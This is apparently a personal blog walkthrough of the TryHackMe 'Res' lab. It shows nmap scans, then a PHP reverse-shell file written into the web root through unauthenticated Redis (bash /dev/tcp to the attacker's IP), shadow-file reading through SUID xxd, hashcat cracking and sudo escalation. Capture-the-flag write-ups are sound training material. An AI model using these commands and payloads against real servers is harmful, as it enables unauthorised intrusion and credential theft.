---
title: Walkthrough - Res
published: true
---

SGBD, Enumeration, RCE, Cracking. Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!

![0xskar](/assets/redis01.png)

[https://tryhackme.com/room/res](https://tryhackme.com/room/res)

* * *

## Scan the machine, how many ports are open?

- ``nmap -Pn -sS -p- 10.10.17.249 -vvv ``
- ``nmap -sC -sV -sT -O -p80,6379 10.10.17.249``

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.1 (92%), Linux 3.2 - 3.16 (92%), Linux 3.2 - 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
```

* * * 

## What's is the database management system installed on the server?

- Redis

* * * 

## What port is the database management system running on?

- 6379

* * * 

## What's is the version of management system installed on the server?

- 6.0.7

* * * 

## Compromise the machine and locate user.txt

- ``redis-cli -h 10.10.17.249`` - to connect to the redis server
- ``info server`` looking here in the server info we find a working directory for redis... ``executable:/home/vianka/redis-stable/src/redis-server``
-  because we can see the users home directory we should be able to import a genetateed rsa key into redis and login to it there.

1. Generate public key ``ssh-keygen -t rsa -f rsa``
2. Write the public key to a file ``(echo -e "\n\n"; cat ./rsa.pub; echo -e "\n\n") > foo.txt``
3. Import the file into redis ``cat foo.txt | redis-cli -h 10.10.17.249 -x set crackit``
4. Save the public key to the authorized_keys file on the redis server
5. whelp this doesnt work... The .ssh directory doesnt seem to be accesssible

So trying some other things our I end up finding the web directory.

```
10.10.17.249:6379> config set dir /var/www/html
OK
10.10.17.249:6379> config set dbfilename redis.php
OK
10.10.17.249:6379> set test "<?php phpinfo(); ?>"
OK
10.10.17.249:6379> save
OK
```

do we can vidit this page now on the webserver. lets alter it do we can get a php reverse shell

```
10.10.131.125:6379> config set dir /var/www/html
OK
10.10.131.125:6379> config set dbfilename shell.php
OK
10.10.131.125:6379> set test "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.2.127.225/6666 0>&1'\"); ?>"
OK
10.10.131.125:6379> save
OK
```

and catch the reverse shell

```
┌──(0xskar㉿cocokali)-[~]
└─$ pwncat -l 10.2.127.225 6666
whoami
www-data
ls -las
total 24
 4 drwxrwxrwx 2 root   root    4096 Aug  9 13:49 .
 4 drwxr-xr-x 3 root   root    4096 Sep  2  2020 ..
12 -rw-r--r-- 1 root   root   11321 Sep  2  2020 index.html
 4 -rw-r--r-- 1 vianka vianka   179 Aug  9 13:49 shell.php
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ 
```

![0xskar](/assets/redis02.png)

* * * 

## What is the local user account password?

```
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chfn
/usr/bin/xxd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
```

If ``xxd`` has the suid bit set we can read files with it.

- ``xxd /etc/shadow | xxd -r``
- ``unshadow`` this file and then hashcat
- ``hashcat -m 1800 creds.unshadow /usr/share/seclists/Passwords/rockyou.txt ``

```
Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:beautiful1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
```

* * * 

## Escalate privileges and obtain root.txt

- ``su vianka``

```
sudo -l
[sudo] password for vianka: beautiful1

Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

Easy enough...

- ``sudo vi -c ':!/bin/sh' /dev/null``

* * * 

